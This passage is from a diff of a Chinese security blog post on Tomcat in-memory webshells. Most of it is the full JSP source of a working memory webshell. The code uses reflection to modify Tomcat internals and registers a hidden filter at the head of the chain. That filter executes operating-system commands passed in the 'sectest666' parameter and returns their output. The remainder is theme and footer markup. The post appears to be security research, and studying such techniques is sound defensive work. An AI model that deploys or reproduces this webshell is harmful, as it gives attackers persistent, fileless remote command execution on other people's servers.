class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">          <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Filter"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                            .getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                    <span class="keyword">if</span> (applicationContext.getFilterRegistration(filterName) == <span class="keyword">null</span> &amp;&amp; standardContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">                        javax.servlet.FilterRegistration.Dynamic filterRegistration = applicationContext</span><br><span class="line">                                .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">                        filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        filterRegistration</span><br><span class="line">                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                                        <span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br><span class="line">                        </span><br><span class="line">                        Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                                .getMethod("filterStart");</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                        Class ccc = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">"org.apache.catalina.deploy.FilterMap"</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//把filter插到第一位</span></span><br><span class="line">                        Class c = Class.forName(<span class="string">"org.apache.catalina.core.StandardContext"</span>);</span><br><span class="line">                        Method m = c.getMethod(<span class="string">"findFilterMaps"</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">                        <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            Object o = filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">"getFilterName"</span>);</span><br><span class="line">                            String name = (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                        out.println(<span class="string">"Filter has been Inject,please visit /xxxxxxx/xx?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/代码审计/">代码审计</a>
-    </span>
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/JAVA/">JAVA</a><a href="/tags/代码审计/">代码审计</a><a href="/tags/SHELL/">SHELL</a>
-    </span>
-    
-
     </div>
 
     
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JAVA/" rel="tag"># JAVA</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/SHELL/" rel="tag"># SHELL</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/" rel="prev" title="JAVA反序列化回显学习">
+      <i class="fa fa-chevron-left"></i> JAVA反序列化回显学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Tomcat内存马实现原理解析-servlet内存马">
+      Tomcat内存马实现原理解析-servlet内存马 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
   </div>
-</article>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#动态注册Filter实现内存马"><span class="nav-number">1.</span> <span class="nav-text">动态注册Filter实现内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是过滤器及为什么要使用过滤器？"><span class="nav-number">1.1.</span> <span class="nav-text">什么是过滤器及为什么要使用过滤器？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何手动创建一个过滤器？"><span class="nav-number">1.2.</span> <span class="nav-text">如何手动创建一个过滤器？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何动态注册Filter"><span class="nav-number">1.3.</span> <span class="nav-text">如何动态注册Filter?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Tomcat中Filter注册流程"><span class="nav-number">1.3.1.</span> <span class="nav-text">Tomcat中Filter注册流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#StandardContext注册Filter"><span class="nav-number">1.3.2.</span> <span class="nav-text">StandardContext注册Filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#servletContext注册Filter"><span class="nav-number">1.3.3.</span> <span class="nav-text">servletContext注册Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MBeanServer获取servletContext"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">MBeanServer获取servletContext</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修改WRAP-SAME-OBJECT从request对象中获取"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">修改WRAP_SAME_OBJECT从request对象中获取</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">藏青</p>
+  <div class="site-description" itemprop="description">知行合一</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">藏青</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
 
   
 
@@ -316,21 +665,18 @@
 
 
 
-    </main>
 
-    <footer class="site-footer">
-  <p class="site-info">
-    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
-    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
-    </br>
-    
-    &copy; 2021 藏青
-    
-  </p>
-</footer>
-    
-    
-  </div>
-</div>
+
+
+
+
+
+
+
+
+  
+
+  
+
 </body>
 </html>
